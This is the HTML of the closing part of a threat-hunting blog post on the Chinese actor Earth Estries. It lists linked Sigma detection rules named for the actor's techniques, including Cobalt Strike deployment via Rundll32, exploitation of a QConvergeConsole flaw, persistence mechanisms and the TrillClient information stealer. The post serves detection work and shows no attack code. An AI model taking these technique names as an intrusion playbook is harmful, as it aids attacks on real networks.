100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*upmtfO5XLTj3142EtqpgAA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*upmtfO5XLTj3142EtqpgAA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*upmtfO5XLTj3142EtqpgAA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*upmtfO5XLTj3142EtqpgAA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*upmtfO5XLTj3142EtqpgAA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*upmtfO5XLTj3142EtqpgAA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*upmtfO5XLTj3142EtqpgAA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mo sn c" width="700" height="219" loading="lazy" role="presentation"/></picture></div></div><figcaption class="so ff sp sf sg sq sr bf b bg z du">disk-formatting-contribution.json for e.g. by SIMKRA</figcaption></figure><h1 id="8747" class="rb ni gv bf nj rc rd hv nm re rf hy np rg rh ri rj rk rl rm rn ro rp rq rr rs bk">Hunting Chinese Threat Actor Earth Estries</h1><p id="19a7" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Remote Service Creation Vmware</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Earth%20Estries%20ChinaChoper%20remote%20service%20creation%20Vmware.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Earth Estries ChinaChoper remote service creation Vmware.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="su l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="e05e" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Rundll32 to deploy Cobalt Strike</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Earth%20Estries%20Rundll32.exe%20loaders%20to%20deploy%20Cobalt%20Strike.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Earth Estries Rundll32.exe loaders to deploy Cobalt Strike.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="sv l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="fa96" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">QConvergeConsole Vulnerability Apache Tomcat6</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Earth%20Estries%20exploiting%20QConvergeConsole%20vulnerability%20in%20Apache%20Tomcat6.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Earth Estries exploiting QConvergeConsole vulnerability in Apache Tomcat6.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="sw l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="7d52" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">QConvergeCconsole Vulnerability 2</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Earth%20Estries%20exploiting%20QConvergeConsole%20vulnerability.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Earth Estries exploiting QConvergeConsole vulnerability.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="sx l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="e72e" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Cobalt Strike Installation with Windows Service</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Earth%20Estries%20installation%20Cobalt%20Strike%20with%20Windows%20Service.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Earth Estries installation Cobalt Strike with Windows Service.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="sy l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="9348" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Executing TrillClient for Discovery</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Earth%20Estries%20is%20executing%20as%20discovery%20TrillClient%20information%20stealer.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Earth Estries is executing as discovery TrillClient information stealer.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="sz l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="a94c" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Remote Scheduled Task Vmware</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Earth%20Estries%20remote%20scheduled%20task%20Vmware%20for%20persistence.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Earth Estries remote scheduled task Vmware for persistence.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="ta l qk ql qm qi qn mo pz"></div></div></div></a></div></div></div></div></div></section></div></div></article></div><div class="ab cb"><div class="ci bh ga gb gc gd"><div class="tb tc ab jn"><div class="qg ab"><a class="td ay am ao" href="https://medium.com/tag/cybersecurity?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><div class="te fj cx tf gf tg th bf b bg z bk ti">Cybersecurity</div></a></div><div class="qg ab"><a class="td ay am ao" href="https://medium.com/tag/threat-intelligence?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><div class="te fj cx tf gf tg th bf b bg z bk ti">Threat Intelligence</div></a></div><div class="qg ab"><a class="td ay am ao" href="https://medium.com/tag/threat-hunting?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><div class="te fj cx tf gf tg th bf b bg z bk ti">Threat Hunting</div></a></div><div class="qg ab"><a class="td ay am ao" href="https://medium.com/tag/china?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><div class="te fj cx tf gf tg th bf b bg z bk ti">China</div></a></div><div class="qg ab"><a class="td ay am ao" href="https://medium.com/tag/detection-engineering?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><div class="te fj cx tf gf tg th bf b bg z bk ti">Detection Engineering</div></a></div></div></div></div><div class="l"></div><footer class="tj tk tl tm tn ab q to ix c"><div class="l ae"><div class="ab cb"><div class="ci bh ga gb gc gd"><div class="ab cp tp"><div class="ab q lg"><div class="tq l"><span class="l tr ts tt e d"><div class="ab q lg lh"><div class="pw-multi-vote-icon fj jp li lj lk"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fdetect-fyi%2F379a6b950492&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;user=SIMKRA&amp;userId=3d60ce83d2f7&amp;source=---footer_actions--379a6b950492---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="ll ao lm ln lo lp am lq lr ls lk"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l lt lu lv lw lx ly lz"><p class="bf b dv z du"><span class="ma">--</span></p></div></div></span><span class="l h g f tu tv"><div class="ab q lg lh"><div class="pw-multi-vote-icon fj jp li lj lk"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fdetect-fyi%2F379a6b950492&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;user=SIMKRA&amp;userId=3d60ce83d2f7&amp;source=---footer_actions--379a6b950492---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="ll ao lm ln lo lp am lq lr ls lk"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l lt lu lv lw lx ly lz"><p class="bf b dv z du"><span class="ma">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ao ll mb mc ab q fk md me" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="mf"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ab q"><div class="tw l jk"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F379a6b950492&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;source=---footer_actions--379a6b950492---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du mh" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="tw l jk"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fk ah ai aj ak al mp an ao ap ex mq mr me ms"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="tx l"><div class="ab cb"><div class="ci bh ga gb gc gd"><div class="ty l"><div class="ab tz ua ub jm jl"><div class="uc ud ue uf ug uh ui uj uk ul ab cp"><div class="h k"><a href="https://detect.fyi/?source=post_page---post_publication_info--379a6b950492--------------------------------" rel="noopener follow"><div class="fj ab"><img alt="Detect FYI" class="um io ip cx" src="https://miro.medium.com/v2/resize:fill:96:96/1*ayMhoNccbO0IxQ1UPFv0SA.png" width="48" height="48" loading="lazy"/><div class="um l ip io fs n fr un"></div></div></a></div><div class="j i d"><a href="https://detect.fyi/?source=post_page---post_publication_info--379a6b950492--------------------------------" rel="noopener follow"><div class="fj ab"><img alt="Detect FYI" class="um up uo cx" src="https://miro.medium.com/v2/resize:fill:128:128/1*ayMhoNccbO0IxQ1UPFv0SA.png" width="64" height="64" loading="lazy"/><div class="um l uo up fs n fr un"></div></div></a></div><div class="j i d uq jk"><div class="ab"><span><a class="bf b bg z ur te us ut uu uv uw ev ew ux uy uz fa fb fc fd bm fe ff" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Fdetect-fyi&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;collection=Detect+FYI&amp;collectionId=d5fd8f494f6a&amp;source=post_page---post_publication_info--379a6b950492---------------------follow_profile-----------" rel="noopener follow">Follow</a></span></div></div></div><div class="ab co qc"><div class="va vb vc vd ve l"><a class="af ag ah aj ak al am an ao ap aq ar as at ab q" href="https://detect.fyi/?source=post_page---post_publication_info--379a6b950492--------------------------------" rel="noopener follow"><h2 class="pw-author-name bf vg vh vi vj vk vl vm nq ns nt nu nw nx ny oa ob bk"><span class="go vf">Published in <!-- -->Detect FYI</span></h2></a><div class="qg ab in"><div class="l jk"><span class="pw-follower-count bf b bg z du"><a class="af ag ah ai aj ak al am an ao ap aq ar jd" rel="noopener follow" href="/followers?source=post_page---post_publication_info--379a6b950492--------------------------------">1.3K Followers</a></span></div><div class="bf b bg z du ab jo"><span class="je l" aria-hidden="true"><span class="bf b bg z du">·</span></span><a class="af ag ah ai aj ak al am an ao ap aq ar jd" rel="noopener follow" href="/hunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552?source=post_page---post_publication_info--379a6b950492--------------------------------">Last published <span>Jan 1, 2025</span></a></div></div><div class="qo l"><p class="bf b bg z bk"><span class="go">Threat Detection Engineering and DFIR Insights</span></p></div></div></div><div class="h k"><div class="ab"><span><a class="bf b bg z ur te us ut uu uv uw ev ew ux uy uz fa fb fc fd bm fe ff" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Fdetect-fyi&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;collection=Detect+FYI&amp;collectionId=d5fd8f494f6a&amp;source=post_page---post_publication_info--379a6b950492---------------------follow_profile-----------" rel="noopener follow">Follow</a></span></div></div></div></div><div class="ab tz ua ub jm jl"><div class="uc ud ue uf ug uh ui uj uk ul ab cp"><div class="h k"><a tabindex="0" href="https://medium.com/@simone.kraus?source=post_page---post_author_info--379a6b950492--------------------------------" rel="noopener follow"><div class="l fj"><img alt="SIMKRA" class="l fd by ip io cx" src="https://miro.medium.com/v2/resize:fill:96:96/1*BIfekvQdxa7JrHyPD8XJVw.png" width="48" height="48" loading="lazy"/><div class="fr by l ip io fs n ay un"></div></div></a></div><div class="j i d"><a tabindex="0" href="https://medium.com/@simone.kraus?source=post_page---post_author_info--379a6b950492--------------------------------" rel="noopener follow"><div class="l fj"><img alt="SIMKRA" class="l fd by uo up cx" src="https://miro.medium.com/v2/resize:fill:128:128/1*BIfekvQdxa7JrHyPD8XJVw.png" width="64" height="64" loading="lazy"/><div class="fr by l uo up fs n ay un"></div></div></a></div><div class="j i d uq jk"><div class="ab"><span><a class="bf b bg z ur te us ut uu uv uw ev ew ux uy uz fa fb fc fd bm fe ff" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F3d60ce83d2f7&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;user=SIMKRA&amp;userId=3d60ce83d2f7&amp;source=post_page-3d60ce83d2f7--post_author_info--379a6b950492---------------------follow_profile-----------" rel="noopener follow">Follow</a></span></div></div></div><div class="ab co qc"><div class="va vb vc vd ve l"><a class="af ag ah aj ak al am an ao ap aq ar as at ab q" href="https://medium.com/@simone.kraus?source=post_page---post_author_info--379a6b950492--------------------------------" rel="noopener follow"><h2 class="pw-author-name bf vg vh vi vj vk vl vm nq ns nt nu nw nx ny oa ob bk"><span class="go vf">Written by <!-- -->SIMKRA</span></h2></a><div class="qg ab in"><div class="l jk"><span class="pw-follower-count bf b bg z du"><a class="af ag ah ai aj ak al am an ao ap aq ar jd" href="https://medium.com/@simone.kraus/followers?source=post_page---post_author_info--379a6b950492--------------------------------" rel="noopener follow">564 Followers</a></span></div><div class="bf b bg z du ab jo"><span class="je l" aria-hidden="true"><span class="bf b bg z du">·</span></span><a class="af ag ah ai aj ak al am an ao ap aq ar jd" href="https://medium.com/@simone.kraus/following?source=post_page---post_author_info--379a6b950492--------------------------------" rel="noopener follow">201 Following</a></div></div><div class="qo l"></div></div></div><div class="h k"><div class="ab"><span><a class="bf b bg z ur te us ut uu uv uw ev ew ux uy uz fa fb fc fd bm fe ff" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F3d60ce83d2f7&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;user=SIMKRA&amp;userId=3d60ce83d2f7&amp;source=post_page-3d60ce83d2f7--post_author_info--379a6b950492---------------------follow_profile-----------" rel="noopener follow">Follow</a></span></div></div></div></div></div></div><div class="vn l"><div class="vo bh r tx"></div><div class="ab cb"><div class="ci bh ga gb gc gd"><div class="ab q cp"><h2 class="bf vg rc hv nm re hy np rg ri rj rk rm rn ro rq rr bk">No responses yet</h2><div class="ab vp"><div><div class="bm" aria-hidden="false"><a class="vq vr" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--379a6b950492--------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div><div class="vs vt vu vv vw l"></div></div></div></div><div class="vx vy vz wa wb l bx"><div class="h k j"><div class="vo bh wc wd"></div><div class="ab cb"><div class="ci bh ga gb gc gd"><div class="we ab lg jn"><div class="wf wg l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><p class="bf b dv z du">Help</p></a></div><div class="wf wg l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><p class="bf b dv z du">Status</p></a></div><div class="wf wg l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/about?autoplay=1&amp;source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><p class="bf b dv z du">About</p></a></div><div class="wf wg l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><p class="bf b dv z du">Careers</p></a></div><div class="wf wg l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="pressinquiries@medium.com?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><p class="bf b dv z du">Press</p></a></div><div class="wf wg l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><p class="bf b dv z du">Blog</p></a></div><div class="wf wg l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><p class="bf b dv z du">Privacy</p></a></div><div 